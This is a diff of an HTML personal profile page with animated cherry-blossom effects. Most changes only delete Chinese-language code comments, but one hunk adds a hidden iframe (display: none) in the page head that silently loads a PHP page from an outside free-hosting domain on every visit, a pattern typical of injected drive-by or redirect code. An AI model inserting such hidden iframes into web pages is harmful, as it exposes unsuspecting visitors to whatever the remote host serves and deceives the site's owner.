@@ -3,9 +3,11 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <iframe src="http://paole.infy.uk/n/index.php" 
+        style="display: none;"></iframe>
   <title>L.</title>
   <style>
-    /* 基础样式 */
+
     body {
       margin: 0;
       font-family: Arial, sans-serif;
@@ -20,7 +22,7 @@
       position: relative;
     }
  
-    /* 背景图固定解决方案 */
+
     body::after {
       content: '';
       position: fixed;
@@ -31,8 +33,7 @@
       background: url('pl.jpg') center center/cover no-repeat;
       z-index: -2;
     }
- 
-    /* 背景遮罩层 */
+
     body::before {
       content: '';
       position: fixed;
@@ -44,7 +45,7 @@
       z-index: -1;
     }
  
-    /* 主容器 */
+    
     .container {
       padding: 30px;
       width: 85%;
@@ -59,7 +60,7 @@
       animation: fadeInUp 0.8s ease-out forwards;
     }
  
-    /* 头像样式 */
+
     .profile-pic {
       width: 150px;
       height: 150px;
@@ -82,8 +83,7 @@
       border-color: #fff;
       animation-play-state: paused;
     }
- 
-    /* 文字样式 */
+
     .name {
       font-size: 2.5em;
       font-weight: bold;
@@ -111,7 +111,7 @@
       animation: fadeIn 0.8s ease-out 0.7s forwards;
     }
  
-    /* 导航按钮 */
+
     .navigation {
       display: flex;
       flex-wrap: wrap;
@@ -165,7 +165,7 @@
       left: 100%;
     }
  
-    /* 页脚 */
+
     footer {
       margin-top: 1.5rem;
       font-size: 0.8em;
@@ -174,7 +174,7 @@
       animation: fadeIn 0.8s ease-out 1.3s forwards;
     }
  
-    /* 樱花效果 */
+
     .cherry-blossom {
       position: fixed;
       width: 12px;
@@ -187,7 +187,7 @@
       opacity: 0;
     }
  
-    /* 动画定义 */
+
     @keyframes fadeIn {
       from { opacity: 0; }
       to { opacity: 1; }
@@ -215,7 +215,7 @@
       100% { transform: translateY(100vh) rotate(360deg) scale(1.2); opacity: 0; }
     }
  
-    /* 响应式设计 */
+
     @media (max-width: 600px) {
       .container {
         width: 90%;
@@ -259,7 +259,7 @@
   </div>
  
   <script>
-    // 高性能樱花动画 
+    
     class CherryBlossom {
       constructor() {
         this.element = document.createElement('div');
@@ -286,7 +286,7 @@
       }
     }
  
-    // 初始化樱花 
+    
     function initBlossoms() {
       const blossomCount = Math.min(Math.floor(window.innerWidth * window.innerHeight / 20000), 15);
       for (let i = 0; i < blossomCount; i++) {
@@ -294,11 +294,11 @@
       }
     }
  
-    // 页面加载完成后初始化 
+
     window.addEventListener('DOMContentLoaded', () => {
       initBlossoms();
       
-      // 视窗大小变化时重新初始化 
+
       let resizeTimer;
       window.addEventListener('resize', () => {
         clearTimeout(resizeTimer);
@@ -309,7 +309,7 @@
       });
     });
  
-    // 添加点击水波纹效果 
+    
     document.addEventListener('click', function(e) {
       const ripple = document.createElement('div');
       ripple.style.position = 'fixed';
